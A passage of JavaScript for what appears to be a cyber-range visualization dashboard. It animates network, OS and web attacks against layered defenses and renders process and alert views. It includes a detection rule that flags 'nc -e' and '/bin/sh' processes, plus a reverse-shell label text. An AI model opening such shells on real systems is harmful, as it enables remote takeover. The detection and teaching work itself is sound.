    if (serverStatus) serverStatus.textContent = 'ONLINE (PORT 8000)';
  }

  renderProcessTree(state.osL7State.pstree, revShell);
  renderFdGauge(state.osL7State.fd_metrics);
  renderL7AlertsTable(state.osL7State.l7_alerts, state.osL7State.l7_counters);
}

function renderProcessTree(pstree, revShell) {
  const container = document.getElementById('pstree-view');
  const card = document.getElementById('pstree-card');
  const statusBadge = document.getElementById('pstree-status-badge');
  const countBadge = document.getElementById('pstree-proc-count-badge');
  const alertBox = document.getElementById('revshell-alert-box');
  const cmdEl = document.getElementById('revshell-cmd-value');
  if (!container) return;

  const nodes = Array.isArray(pstree) ? pstree : [];
  let totalProcs = 0;
  let hasMalicious = Boolean(revShell && revShell.active);

  function buildTreeHtml(list, isRoot = false) {
    const ulClass = isRoot ? 'pstree-root' : 'pstree-branch';
    let html = `<ul class="${ulClass}">`;
    for (const proc of list) {
      totalProcs += 1;
      const isMal = Boolean(
        proc.suspicious ||
          proc.name === '/bin/sh' ||
          proc.name === 'sh' ||
          proc.name === 'nc' ||
          proc.name === 'bash' ||
          (typeof proc.cmd === 'string' && (proc.cmd.includes('/bin/sh') || proc.cmd.includes('nc -e'))),
      );
      if (isMal) hasMalicious = true;

      const rowClass = isMal ? 'pstree-node-row pstree-node-malicious' : 'pstree-node-row';
      const icon = isMal ? '🚨' : proc.pid === 1 ? '⚙️' : '🔹';
      html += `<li class="pstree-item">`;
      html += `<div class="${rowClass}">`;
      html += `<span>${icon}</span>`;
      html += `<span class="pstree-pid">[PID ${escapeHtml(proc.pid)}]</span>`;
      html += `<span class="pstree-user">(${escapeHtml(proc.user || 'node')})</span>`;
      html += `<code class="pstree-cmd">${escapeHtml(proc.cmd || proc.name)}</code>`;
      html += `</div>`;
      if (Array.isArray(proc.children) && proc.children.length > 0) {
        html += buildTreeHtml(proc.children, false);
      }
      html += `</li>`;
    }
    html += `</ul>`;
    return html;
  }

  container.innerHTML = buildTreeHtml(nodes, true);
  if (countBadge) countBadge.textContent = `${totalProcs} procs`;

  if (hasMalicious) {
    card.classList.add('card-alert-red');
    statusBadge.className = 'badge badge-attack';
    statusBadge.textContent = '🚨 SHELL SPAWNED (/bin/sh)';
    alertBox.classList.remove('hidden');
    if (cmdEl && revShell && revShell.shell_cmd) {
      cmdEl.textContent = revShell.shell_cmd;
    }
  } else {
    card.classList.remove('card-alert-red');
    statusBadge.className = 'badge badge-normal';
    statusBadge.textContent = 'OS: CLEAN';
    alertBox.classList.add('hidden');
  }
}

function renderFdGauge(fdMetrics) {
  if (!fdMetrics) return;
  const openFds = typeof fdMetrics.open_fds === 'number' ? fdMetrics.open_fds : 42;
  const maxFds = typeof fdMetrics.max_fds === 'number' && fdMetrics.max_fds > 0 ? fdMetrics.max_fds : 1024;
  const peakFds = typeof fdMetrics.peak_fds === 'number' ? fdMetrics.peak_fds : openFds;
  const procCount = typeof fdMetrics.process_count === 'number' ? fdMetrics.process_count : 4;

  const ratio = Math.min(1, Math.max(0, openFds / maxFds));
  const pct = Math.round(ratio * 100);

  // Arc length of semicircle R=55 is PI * 55 ≈ 172.8
  const arcTotal = 173;
  const dashOffset = Math.round(arcTotal * (1 - ratio));

  const arcEl = document.getElementById('fd-arc-fill');
  const pctEl = document.getElementById('fd-gauge-percent');
  const openEl = document.getElementById('fd-open-count');
  const maxEl = document.getElementById('fd-max-limit');
  const statOpen = document.getElementById('fd-stat-open');
  const statMax = document.getElementById('fd-stat-max');
  const statPeak = document.getElementById('fd-stat-peak');
  const statProcs = document.getElementById('fd-stat-procs');
  const linearFill = document.getElementById('fd-linear-fill');
  const statusBadge = document.getElementById('fd-status-badge');
  const card = document.getElementById('fd-gauge-card');
  const filesListEl = document.getElementById('fd-files-list');

  if (arcEl) arcEl.setAttribute('stroke-dashoffset', String(dashOffset));
  if (pctEl) pctEl.textContent = `${pct}%`;
  if (openEl) openEl.textContent = String(openFds);
  if (maxEl) maxEl.textContent = String(maxFds);
  if (statOpen) statOpen.textContent = String(openFds);
  if (statMax) statMax.textContent = String(maxFds);
  if (statPeak) statPeak.textContent = String(peakFds);
  if (statProcs) statProcs.textContent = String(procCount);
  if (linearFill) linearFill.style.width = `${Math.max(4, pct)}%`;

  if (pct >= 85 || fdMetrics.status === 'EXHAUSTED') {
    if (arcEl) arcEl.setAttribute('class', 'fd-arc-fill fd-critical');
    if (linearFill) linearFill.className = 'meter-fill fill-red';
    if (statusBadge) {
      statusBadge.className = 'badge badge-attack';
      statusBadge.textContent = '🔥 EMFILE: FD EXHAUSTED';
    }
    if (card) card.classList.add('card-alert-red');
  } else if (pct >= 55 || fdMetrics.status === 'WARNING') {
    if (arcEl) arcEl.setAttribute('class', 'fd-arc-fill fd-warn');
    if (linearFill) linearFill.className = 'meter-fill fill-yellow';
    if (statusBadge) {
      statusBadge.className = 'badge badge-mitm';
      statusBadge.textContent = '⚠️ FD: ELEVATED';
    }
    if (card) card.classList.remove('card-alert-red');
  } else {
    if (arcEl) arcEl.setAttribute('class', 'fd-arc-fill');
    if (linearFill) linearFill.className = 'meter-fill fill-green';
    if (statusBadge) {
      statusBadge.className = 'badge badge-normal';
      statusBadge.textContent = 'FD: NORMAL';
    }
    if (card) card.classList.remove('card-alert-red');
  }

  if (filesListEl) {
    const files = Array.isArray(fdMetrics.suspicious_files) ? fdMetrics.suspicious_files : [];
    if (files.length > 0) {
      filesListEl.textContent = files.join(' | ');
      filesListEl.style.color = '#DC2626';
    } else {
      filesListEl.textContent = 'Standard sockets & SQLite WAL descriptors healthy';
      filesListEl.style.color = 'var(--text-navy)';
    }
  }
}

function renderL7AlertsTable(alerts, counters) {
  const listEl = document.getElementById('l7-alerts-list');
  const totalBadge = document.getElementById('l7-alert-total-badge');
  const card = document.getElementById('l7-alerts-card');
  const cntSqli = document.getElementById('cnt-sqli');
  const cntBf = document.getElementById('cnt-bruteforce');
  const cntCmd = document.getElementById('cnt-cmd');
  const cntPath = document.getElementById('cnt-traversal');
  if (!listEl) return;

  const c = counters || {};
  if (cntSqli) cntSqli.textContent = String(c.sqli_count || 0);
  if (cntBf) cntBf.textContent = String(c.brute_force_count || 0);
  if (cntCmd) cntCmd.textContent = String(c.cmd_injection_count || 0);
  if (cntPath) cntPath.textContent = String(c.path_traversal_count || 0);

  const list = Array.isArray(alerts) ? alerts : [];
  if (totalBadge) {
    totalBadge.textContent = `${list.length} alerts`;
    totalBadge.className = list.length > 0 ? 'badge badge-attack' : 'badge badge-normal';
  }
  if (card) {
    card.classList.toggle('card-alert-red', list.some((a) => !a.blocked));
  }

  if (list.length === 0) {
    listEl.innerHTML = `
      <div class="sniffer-empty">
        Chưa phát hiện cảnh báo Tầng Ứng dụng (L7). Khi có đòn tấn công <strong>SQL Injection</strong>, <strong>Brute-force Login</strong>, <strong>OS Command Injection</strong> hoặc <strong>Path Traversal</strong>, chi tiết payload sẽ hiển thị tại đây.
      </div>
    `;
    return;
  }

  listEl.innerHTML = '';
  for (const item of list.slice(-15).reverse()) {
    const div = document.createElement('div');
    div.className = item.blocked ? 'l7-alert-item alert-blocked' : 'l7-alert-item';
    const timeStr = item.timestamp ? new Date(item.timestamp).toTimeString().split(' ')[0] : '--:--:--';
    const stateLabel = item.blocked
      ? `<span class="badge badge-shield">🛡️ BLOCKED (${escapeHtml(item.status_code)})</span>`
      : `<span class="badge badge-attack">💥 EXPLOITED (${escapeHtml(item.status_code)})</span>`;

    div.innerHTML = `
      <div class="l7-alert-top">
        <span class="l7-alert-cat">[${escapeHtml(timeStr)}] ${escapeHtml(item.category)}</span>
        ${stateLabel}
      </div>
      <div class="l7-alert-top">
        <span>SRC: <code>${escapeHtml(item.client_ip)}</code> &rarr; <strong>${escapeHtml(item.endpoint)}</strong></span>
      </div>
      <div class="l7-alert-payload" title="${escapeHtml(item.payload_preview)}">
        Payload: <code>${escapeHtml(item.payload_preview)}</code>
      </div>
    `;
    listEl.appendChild(div);
  }
}

// ==========================================
// 4. CANVAS TOPOLOGY PARTICLE ENGINE & W5-T1 3-LAYER SHIELD COLLISION
// ==========================================
let canvas, ctx;
let particles = [];
let shieldImpactSparks = [];
let floatingLabels = [];

// Bán kính va chạm của 3 Lớp Khiên Chắn đồng tâm quanh Target Server (Task W5-T1)
const SHIELD_RADII = {
  L1_NETWORK: 152, // Vòng ngoài cùng (Cyan): Static ARP + iptables SYN/RST Filter
  L2_OS: 126,      // Vòng giữa (Amber/Yellow): tcp_syncookies=1 + ulimit/cgroups + nologin
  L3_APP: 98,      // Vòng trong cùng (Green): Prepared SQL + Token Bucket + Input Sanitizer
};

/**
 * Xác định lớp khiên nào sẽ chặn đòn tấn công này (Phễu Phòng thủ 3 Lớp - Task W5-T1)
 * Trả về null nếu không có lớp khiên tương ứng nào đang bật (gói tin lọt qua phễu và đánh trúng đích!)
 */
function resolveBlockingShieldLayer(tag) {
  // 1. Tấn công Mạng L2/L4: ARP Spoofing & TCP RST Injection -> Chặn tại Khiên Mạng L1
  if (tag === 'ARP_SPOOF') {
    if (state.defenseL1Active) {
      return {
        layer: 'L1',
        radius: SHIELD_RADII.L1_NETWORK,
        color: '#1D4ED8',
        label: '🛡️ BLOCKED [L1: STATIC ARP]',
      };
    }
    return null;
  }

  if (tag === 'RST_INJECTION') {
    if (state.defenseL1Active) {
      return {
        layer: 'L1',
        radius: SHIELD_RADII.L1_NETWORK,
        color: '#1D4ED8',
        label: '🛡️ DROPPED [L1: IPTABLES RST FILTER]',
      };
    }
    return null;
  }

  // 2. TCP SYN Flood (L4): Chặn ở Vòng ngoài L1 (iptables limit) HOẶC Vòng giữa L2 (Kernel tcp_syncookies=1)
  if (tag === 'SYN_FLOOD') {
    if (state.defenseL1Active) {
      return {
        layer: 'L1',
        radius: SHIELD_RADII.L1_NETWORK,
        color: '#1D4ED8',
        label: '🛡️ DROPPED [L1: IPTABLES SYN LIMIT]',
      };
    }
    if (state.defenseL2Active) {
      return {
        layer: 'L2',
        radius: SHIELD_RADII.L2_OS,
        color: '#1D4ED8',
        label: '🛡️ MITIGATED [L2: TCP_SYNCOOKIES=1]',
      };
    }
    return null;
  }

  // 3. Tấn công Tài nguyên Hệ điều hành: FD Exhaustion (lsof) & Fork Bomb -> Chặn tại Vòng giữa L2 (ulimit / cgroups)
  if (tag === 'FD_EXHAUSTION' || tag === 'FORK_BOMB') {
    if (state.defenseL2Active) {
      return {
        layer: 'L2',
        radius: SHIELD_RADII.L2_OS,
        color: '#1D4ED8',
        label: '🛡️ CONTAINED [L2: ULIMIT / CGROUPS]',
      };
    }
    return null;
  }

  // 4. OS Command Injection & Reverse Shell:
  // - Nếu L3 (Input Sanitization) BẬT -> Chặn ở Vòng trong cùng L3 (98px)
  // - Nếu L3 TẮT nhưng L2 (OS nologin/cgroups) BẬT -> Chặn khi cố mở tiến trình shell tại Vòng giữa L2 (126px)
  if (tag === 'COMMAND_INJECTION' || tag === 'REVERSE_SHELL') {
    const l3SanitizerOn = Boolean(
      state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.input_sanitization),
    );
    if (l3SanitizerOn && tag !== 'REVERSE_SHELL') {
      return {
        layer: 'L3',
        radius: SHIELD_RADII.L3_APP,
        color: '#1D4ED8',
        label: '🛡️ BLOCKED [L3: INPUT SANITIZER]',
      };
    }
    if (state.defenseL2Active) {
      return {
        layer: 'L2',
        radius: SHIELD_RADII.L2_OS,
        color: '#1D4ED8',
        label: '🛡️ SHELL KILLED [L2: NOLOGIN / CGROUPS]',
      };
    }
    return null;
  }

  // 5. Tấn công Tầng Ứng dụng L7 (Lọt qua L1 & L2 vì là gói TCP/HTTP hợp lệ -> Chỉ bị chặn bởi Vòng trong cùng L3)
  if (tag === 'SQL_INJECTION') {
    const l3SqliOn = Boolean(
      state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.anti_sqli),
    );
    if (l3SqliOn) {
      return {
        layer: 'L3',
        radius: SHIELD_RADII.L3_APP,
        color: '#1D4ED8',
        label: '🛡️ BLOCKED [L3: PREPARED STATEMENTS]',
      };
    }
    return null;
  }

  if (tag === 'BRUTE_FORCE' || tag === 'HEAVY_DOS') {
    const l3RateLimitOn = Boolean(
      state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.rate_limit),
    );
    if (l3RateLimitOn) {
      return {
        layer: 'L3',
        radius: SHIELD_RADII.L3_APP,
        color: '#1D4ED8',
        label: '🛡️ 429 BLOCKED [L3: TOKEN BUCKET]',
      };
    }
    return null;
  }

  if (tag === 'PATH_TRAVERSAL') {
    const l3SanitizerOn = Boolean(
      state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.input_sanitization),
    );
    if (l3SanitizerOn) {
      return {
        layer: 'L3',
        radius: SHIELD_RADII.L3_APP,
        color: '#1D4ED8',
        label: '🛡️ BLOCKED [L3: PATH SANITIZER]',
      };
    }
    return null;
  }

  // Mặc định cho các đòn tấn công khác
  if (state.defenseL3Active) {
    return {
      layer: 'L3',
      radius: SHIELD_RADII.L3_APP,
      color: '#1D4ED8',
      label: '🛡️ BLOCKED [L3: APP SHIELD]',
    };
  }
  return null;
}

function initCanvas() {
  canvas = document.getElementById('topology-canvas');
  ctx = canvas.getContext('2d');

  resizeCanvas();
  window.addEventListener('resize', resizeCanvas);

  // Vòng lặp animation 60 FPS
  requestAnimationFrame(renderCanvasLoop);
}

function resizeCanvas() {
  const wrapper = document.getElementById('canvas-wrapper');
  canvas.width = wrapper.clientWidth;
  canvas.height = wrapper.clientHeight;
}

function clearParticles() {
  particles = [];
  shieldImpactSparks = [];
  floatingLabels = [];
}

/**
 * Tạo hạt di chuyển dựa trên bản tin Telemetry
 */
function spawnPacketParticles(log) {
  const isAttack = Boolean(log.is_suspicious || (log.attack_tag && log.attack_tag !== 'NORMAL'));
  const clientNode = document.getElementById('node-client');
  const serverNode = document.getElementById('node-server');
  const hackerNode = document.getElementById('node-hacker');
  const wrapper = document.getElementById('canvas-wrapper');

  const wrapRect = wrapper.getBoundingClientRect();
  const clientRect = clientNode.getBoundingClientRect();
  const serverRect = serverNode.getBoundingClientRect();
  const hackerRect = hackerNode.getBoundingClientRect();

  // Tọa độ tâm các Node
  const clientPos = {
    x: clientRect.left - wrapRect.left + clientRect.width / 2,
    y: clientRect.top - wrapRect.top + clientRect.height / 2,
  };
  const serverPos = {
    x: serverRect.left - wrapRect.left + serverRect.width / 2,
    y: serverRect.top - wrapRect.top + serverRect.height / 2,
  };
  const hackerPos = {
    x: hackerRect.left - wrapRect.left + hackerRect.width / 2,
    y: hackerRect.top - wrapRect.top + hackerRect.height / 2,
  };

  if (log.attack_tag === 'ARP_SPOOF') {
    // Hacker phát gói ARP Reply giả mạo sang cả Client và Server
    const targets = [clientPos, serverPos];
    for (const tPos of targets) {
      for (let i = 0; i < 6; i++) {
        particles.push({
          x: hackerPos.x,
          y: hackerPos.y,
          targetX: tPos.x,
          targetY: tPos.y,
          startX: hackerPos.x,
          startY: hackerPos.y,
          progress: 0,
          speed: 0.018 + Math.random() * 0.012,
          type: 'ARP_SPOOF',
          color: '#EF4444',
          size: 3.5 + Math.random() * 1.8,
          tag: 'ARP_SPOOF',
          spread: (Math.random() - 0.5) * 25,
        });
      }
    }
    floatingLabels.push({
      x: hackerPos.x - 75,
      y: hackerPos.y - 25,
      text: state.defenseL1Active ? '🛡️ ARP SPOOF -> BLOCKED BY L1 STATIC ARP!' : '⚠️ ARP REPLY: SPOOFED MAC!',
      alpha: 1,
      color: state.defenseL1Active ? '#1D4ED8' : '#D97706',
    });
    // Nếu Khiên Mạng L1 tắt -> luồng gói tin Client bị bẻ góc đi vòng qua Hacker -> Server
    // Nếu Khiên Mạng L1 bật -> Static ARP bảo vệ luồng Client -> Server đi thẳng xanh ngọc bình thường!
    if (!state.defenseL1Active) {
      spawnMitmBentParticles(clientPos, hackerPos, serverPos);
    } else {
      for (let i = 0; i < 4; i++) {
        particles.push({
          x: clientPos.x,
          y: clientPos.y + (Math.random() * 14 - 7),
          targetX: serverPos.x,
          targetY: serverPos.y + (Math.random() * 14 - 7),
          startX: clientPos.x,
          startY: clientPos.y,
          progress: 0,
          speed: 0.014 + Math.random() * 0.008,
          type: 'NORMAL',
          color: '#10B981',
          size: 3.2,
          tag: 'NORMAL',
          spread: (Math.random() - 0.5) * 20,
        });
      }
    }
    return;
  }

  if (log.attack_tag === 'RST_INJECTION') {
    // Nếu Khiên Mạng L1 tắt -> gói TCP RST đánh sập phiên Client-Server
    if (!state.defenseL1Active) {
      const rstBadge = document.getElementById('rst-badge-indicator');
      const clientStatus = document.getElementById('client-status');
      rstBadge.classList.remove('hidden');
      clientStatus.textContent = '⚡ CONN RESET (RST)';
      clientNode.classList.add('compromised');
      if (state.rstBannerTimer) clearTimeout(state.rstBannerTimer);
      state.rstBannerTimer = setTimeout(() => {
        rstBadge.classList.add('hidden');
        clientStatus.textContent = 'IDLE';
        clientNode.classList.remove('compromised');
      }, 4000);

      // Hủy các hạt xanh đang bay trên đường truyền Client <-> Server (hiệu ứng đứt phiên)
      for (let i = particles.length - 1; i >= 0; i--) {
        if (particles[i].type === 'NORMAL') {
          spawnShieldDeflection(particles[i].x, particles[i].y, '#DC2626', '⚡ TCP RST! SESSION DROPPED');
          particles.splice(i, 1);
        }
      }
    }

    const midX = (clientPos.x + serverPos.x) / 2;
    const midY = (clientPos.y + serverPos.y) / 2;
    const rstTargets = state.defenseL1Active ? [serverPos, clientPos] : [clientPos, serverPos, { x: midX, y: midY }];
    for (const dst of rstTargets) {
      for (let i = 0; i < 5; i++) {
        particles.push({
          x: hackerPos.x,
          y: hackerPos.y,
          targetX: dst.x,
          targetY: dst.y,
          startX: hackerPos.x,
          startY: hackerPos.y,
          progress: 0,
          speed: 0.025 + Math.random() * 0.015,
          type: 'RST_INJECTION',
          color: '#EF4444',
          size: 4 + Math.random() * 1.5,
          tag: 'RST_INJECTION',
          spread: (Math.random() - 0.5) * 18,
        });
      }
    }
    floatingLabels.push({
      x: midX - 65,
      y: midY,
      text: state.defenseL1Active ? '🛡️ L1 IPTABLES: FORGED RST DROPPED' : '⚡ TCP RST [CONN RESET]',
      alpha: 1,
      color: state.defenseL1Active ? '#1D4ED8' : '#DC2626',
    });
    return;
  }

  if (log.attack_tag === 'COMMAND_INJECTION' || log.attack_tag === 'REVERSE_SHELL') {
    const l3SanitizerOn = Boolean(
      state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.input_sanitization),
    );
    const isBlockedByL3 = Boolean(l3SanitizerOn && log.status_code >= 400 && log.attack_tag !== 'REVERSE_SHELL');
    const isBlockedByL2 = Boolean(state.defenseL2Active);
    // 1. Hacker gửi payload Command Injection lên Server
    for (let i = 0; i < 8; i++) {
      particles.push({
        x: hackerPos.x,
        y: hackerPos.y,
        targetX: serverPos.x,
        targetY: serverPos.y,
        startX: hackerPos.x,
        startY: hackerPos.y,
        progress: 0,
        speed: 0.018 + Math.random() * 0.012,
        type: 'ATTACK',
        color: '#EF4444',
        size: 3.5 + Math.random() * 1.8,
        tag: log.attack_tag,
        spread: (Math.random() - 0.5) * 28,
      });
    }
    // 2. Nếu cả Khiên L3 và Khiên HĐH L2 đều TẮT -> Server mở kết nối Reverse Shell NGƯỢC về Hacker (Server -> Hacker)
    if (!isBlockedByL3 && !isBlockedByL2) {
      spawnReverseShellOutboundParticles(serverPos, hackerPos, 14);
      floatingLabels.push({
        x: (serverPos.x + hackerPos.x) / 2 - 55,
        y: (serverPos.y + hackerPos.y) / 2 - 15,
        text: '🐚 REVERSE SHELL: /bin/sh -> HACKER:4444',
        alpha: 1,
        color: '#DC2626',
      });
    }
    return;
  }

  if (isAttack) {
    // Kẻ tấn công bắn hạt đỏ #EF4444 từ Hacker đến Server
    const isSynFlood = log.attack_tag === 'SYN_FLOOD';
    const particleCount = isSynFlood ? 24 : log.attack_tag === 'HEAVY_DOS' ? 18 : 8;
    for (let i = 0; i < particleCount; i++) {
      particles.push({
        x: hackerPos.x,
        y: hackerPos.y + (Math.random() * 20 - 10),
        targetX: serverPos.x,
        targetY: serverPos.y + (Math.random() * 20 - 10),
        startX: hackerPos.x,
        startY: hackerPos.y,
        progress: 0,
        speed: 0.015 + Math.random() * 0.018,
        type: 'ATTACK',
        color: '#EF4444',
        size: 3.2 + Math.random() * 2.0,
        tag: log.attack_tag || 'ATTACK',
        spread: (Math.random() - 0.5) * 45,
      });
    }
    if (isSynFlood) {
      floatingLabels.push({
        x: (hackerPos.x + serverPos.x) / 2 - 40,
        y: (hackerPos.y + serverPos.y) / 2,
        text: '🌊 SYN FLOOD (+SYN_RECV)',
        alpha: 1,
        color: '#DC2626',
      });
    }

    // Hiệu ứng nhấp nháy Hacker Node
    hackerNode.classList.add('compromised');
    setTimeout(() => hackerNode.classList.remove('compromised'), 500);
  } else {
    // Lưu lượng Client bình thường:
    // Nếu đang bị ARP Spoofing (MitM), gói tin bị bẻ góc đi vòng qua Node Hacker (Client -> Hacker -> Server)
    if (state.networkState.mitm_active) {
      spawnMitmBentParticles(clientPos, hackerPos, serverPos);
    } else {
      // Đường truyền thẳng bình thường Client -> Server (Chấm tròn xanh ngọc #10B981)
      for (let i = 0; i < 4; i++) {
        particles.push({
          x: clientPos.x,
          y: clientPos.y + (Math.random() * 16 - 8),
          targetX: serverPos.x,
          targetY: serverPos.y + (Math.random() * 16 - 8),
          startX: clientPos.x,
          startY: clientPos.y,
          progress: 0,
          speed: 0.012 + Math.random() * 0.01,
          type: 'NORMAL',
          color: '#10B981',
          size: 3.2 + Math.random() * 1.6,
          tag: 'NORMAL',
          spread: (Math.random() - 0.5) * 24,
        });
      }
    }
  }
}

/**
 * Tạo hạt di chuyển theo đường gấp khúc bẻ góc qua Node Hacker:
 * Chặng 1: Client -> Hacker (màu xanh ngọc #10B981)
 * Chặng 2: Hacker -> Target Server (đổi sang màu cam #D97706 báo hiệu đã bị Sniff!)
 */
function spawnMitmBentParticles(clientPos, hackerPos, serverPos) {
  for (let i = 0; i < 5; i++) {
    particles.push({
      x: clientPos.x,
      y: clientPos.y,
      startX: clientPos.x,
      startY: clientPos.y,
      targetX: hackerPos.x,
      targetY: hackerPos.y,
      finalTargetX: serverPos.x,
      finalTargetY: serverPos.y,
      mitmRelay: true,
      leg: 1,
      progress: 0,
      speed: 0.016 + Math.random() * 0.01,
      type: 'NORMAL',
      color: '#10B981',
      size: 3.2 + Math.random() * 1.5,
      tag: 'MITM_SNIFFED',
      spread: (Math.random() - 0.5) * 14,
    });
  }
}

/**
 * W4-T1: Tạo luồng hạt Reverse Shell đi NGƯỢC từ Target Server (.20) về Hacker (.66)
 */
function spawnReverseShellOutboundParticles(serverPos, hackerPos, count = 6) {
  for (let i = 0; i < count; i++) {
    particles.push({
      x: serverPos.x,
      y: serverPos.y,
      startX: serverPos.x,
      startY: serverPos.y,
      targetX: hackerPos.x,
      targetY: hackerPos.y,
      progress: 0,
      speed: 0.015 + Math.random() * 0.012,
      type: 'REVERSE_SHELL',
      color: i % 2 === 0 ? '#EF4444' : '#D97706',
      size: 3.5 + Math.random() * 1.6,
      tag: 'REVERSE_SHELL',
      spread: (Math.random() - 0.5) * 22,
    });
  }
}

function startReverseShellBeaconLoop() {
  setInterval(() => {
    if (!state.osL7State || !state.osL7State.reverse_shell || !state.osL7State.reverse_shell.active) return;
    const serverNode = document.getElementById('node-server');
    const hackerNode = document.getElementById('node-hacker');
    const wrapper = document.getElementById('canvas-wrapper');
    if (!serverNode || !hackerNode || !wrapper) return;

    const wrapRect = wrapper.getBoundingClientRect();
    const sR = serverNode.getBoundingClientRect();
    const hR = hackerNode.getBoundingClientRect();
    const serverPos = {
      x: sR.left - wrapRect.left + sR.width / 2,
      y: sR.top - wrapRect.top + sR.height / 2,
    };
    const hackerPos = {
      x: hR.left - wrapRect.left + hR.width / 2,
      y: hR.top - wrapRect.top + hR.height / 2,
    };
    spawnReverseShellOutboundParticles(serverPos, hackerPos, 4);
  }, 1400);
}

function renderCanvasLoop() {
  state.perf.frameCount += 1;
  const now = performance.now();
  if (now - state.perf.lastFpsCheck >= 1000) {
    state.perf.currentFps = Math.min(60, Math.round((state.perf.frameCount * 1000) / (now - state.perf.lastFpsCheck)));
    state.perf.frameCount = 0;
    state.perf.lastFpsCheck = now;
  }

  // W6-T1: Cắt tỉa hạt nếu vượt ngưỡng trần MAX_ACTIVE_PARTICLES để chống lag khi bắn SYN Flood
  if (particles.length > MAX_ACTIVE_PARTICLES) {
    particles.splice(0, particles.length - MAX_ACTIVE_PARTICLES);
  }
  if (shieldImpactSparks.length > MAX_SPARKS) {
    shieldImpactSparks.splice(0, shieldImpactSparks.length - MAX_SPARKS);
  }
  if (floatingLabels.length > MAX_FLOATING_LABELS) {
    floatingLabels.splice(0, floatingLabels.length - MAX_FLOATING_LABELS);
  }

  // Vẽ nền trắng tinh #FFFFFF kèm lưới tọa độ kỹ thuật mờ #F1F5F9 trực tiếp trên Canvas
  drawBlueprintCanvasBackground();

  // Vẽ các đường mạch kết nối (Circuit Connection Paths) & bức tường chắn Cobalt #1D4ED8
  drawNetworkLinks();

  // Cập nhật và vẽ các hạt di chuyển
  updateAndDrawParticles();

  // Cập nhật và vẽ tia lửa va chạm khiên
  updateAndDrawSparks();

  // Cập nhật text nổi (+BLOCKED L3)
  updateAndDrawFloatingLabels();

  requestAnimationFrame(renderCanvasLoop);
}

function drawBlueprintCanvasBackground() {
  const w = canvas.width;
  const h = canvas.height;
  ctx.fillStyle = '#FEFEFF';
  ctx.fillRect(0, 0, w, h);

  // 1. Lưới tọa độ vuông kỹ thuật mờ (Orthogonal Technical Grid #F1F5F9)
  const sqStep = 20;
  ctx.save();
  ctx.beginPath();
  ctx.strokeStyle = '#F1F5F9';
  ctx.lineWidth = 1;
  for (let x = 0; x <= w; x += sqStep) {
    ctx.moveTo(x + 0.5, 0);
    ctx.lineTo(x + 0.5, h);
  }
  for (let y = 0; y <= h; y += sqStep) {
    ctx.moveTo(0, y + 0.5);
    ctx.lineTo(w, y + 0.5);
  }
  ctx.stroke();

  // 2. Lưới kim cương Isometric đặc trưng của Protocol Explorer (62.354 x 36, stroke #E4EAF5)
  const isoW = 62.354;
  const isoH = 36;
  ctx.beginPath();
  ctx.strokeStyle = '#E4EAF5';
  ctx.lineWidth = 1;
  const cols = Math.ceil(w / isoW) + 4;
  const rows = Math.ceil(h / isoH) + 4;
  for (let r = -2; r < rows; r++) {
    for (let c = -2; c < cols; c++) {
      const x0 = c * isoW;
      const y0 = r * isoH;
      ctx.moveTo(x0, y0);
      ctx.lineTo(x0 + isoW, y0 + isoH);
      ctx.moveTo(x0 + isoW, y0);
      ctx.lineTo(x0, y0 + isoH);
    }
  }
  ctx.stroke();

  // 3. Hiệu ứng Radial Vignette mờ dần ở rìa vùng vẽ như Protocol Explorer (#grid-vignette)
  const grad = ctx.createRadialGradient(w * 0.5, h * 0.5, Math.min(w, h) * 0.22, w * 0.5, h * 0.5, Math.max(w, h) * 0.72);
  grad.addColorStop(0, 'rgba(254, 254, 255, 0)');
  grad.addColorStop(0.65, 'rgba(254, 254, 255, 0.25)');
  grad.addColorStop(1, 'rgba(254, 254, 255, 0.85)');
  ctx.fillStyle = grad;
  ctx.fillRect(0, 0, w, h);
  ctx.restore();
}

function drawDirectionalLane(x1, y1, x2, y2, strokeColor = '#BCCAE6', lineDash = [6, 5], lineWidth = 2) {
  const dx = x2 - x1;
  const dy = y2 - y1;
  const dist = Math.hypot(dx, dy);
  if (dist < 40) return;

  // Rút ngắn điểm đầu & điểm cuối để mũi tên dừng gọn ở mép thẻ Node như Protocol Explorer
  const padStart = 76;
  const padEnd = 86;
  if (dist <= padStart + padEnd) return;

  const ux = dx / dist;
  const uy = dy / dist;
  const sx = x1 + ux * padStart;
  const sy = y1 + uy * padStart;
  const ex = x2 - ux * padEnd;
  const ey = y2 - uy * padEnd;

  ctx.save();
  ctx.beginPath();
  ctx.strokeStyle = strokeColor;
  ctx.lineWidth = lineWidth;
  ctx.setLineDash(lineDash);
  ctx.moveTo(sx, sy);
  ctx.lineTo(ex, ey);
  ctx.stroke();

  // Vẽ đầu mũi tên sắc nét (marker-end #head-idle)
  ctx.setLineDash([]);
  const angle = Math.atan2(ey - sy, ex - sx);
  const headLen = 7.5;
  ctx.fillStyle = strokeColor;
  ctx.beginPath();
  ctx.moveTo(ex, ey);
  ctx.lineTo(ex - headLen * Math.cos(angle - Math.PI / 6), ey - headLen * Math.sin(angle - Math.PI / 6));
  ctx.lineTo(ex - headLen * Math.cos(angle + Math.PI / 6), ey - headLen * Math.sin(angle + Math.PI / 6));
  ctx.closePath();
  ctx.fill();
  ctx.restore();
}

function drawNetworkLinks() {
  const clientNode = document.getElementById('node-client');
  const serverNode = document.getElementById('node-server');
  const hackerNode = document.getElementById('node-hacker');
  const wrapper = document.getElementById('canvas-wrapper');

  if (!clientNode || !serverNode || !hackerNode) return;

  const wrapRect = wrapper.getBoundingClientRect();
  const cR = clientNode.getBoundingClientRect();
  const sR = serverNode.getBoundingClientRect();
  const hR = hackerNode.getBoundingClientRect();

  const cX = cR.left - wrapRect.left + cR.width / 2;
  const cY = cR.top - wrapRect.top + cR.height / 2;
  const sX = sR.left - wrapRect.left + sR.width / 2;
  const sY = sR.top - wrapRect.top + sR.height / 2;
  const hX = hR.left - wrapRect.left + hR.width / 2;
  const hY = hR.top - wrapRect.top + hR.height / 2;

  if (state.networkState.mitm_active) {
    // Đường thẳng Client -> Server bị vô hiệu hóa khi bị ARP Spoofing
    drawDirectionalLane(cX, cY, sX, sY, '#CBD5E1', [4, 6], 1.5);

    ctx.save();
    ctx.font = '700 10.5px "JetBrains Mono", monospace';
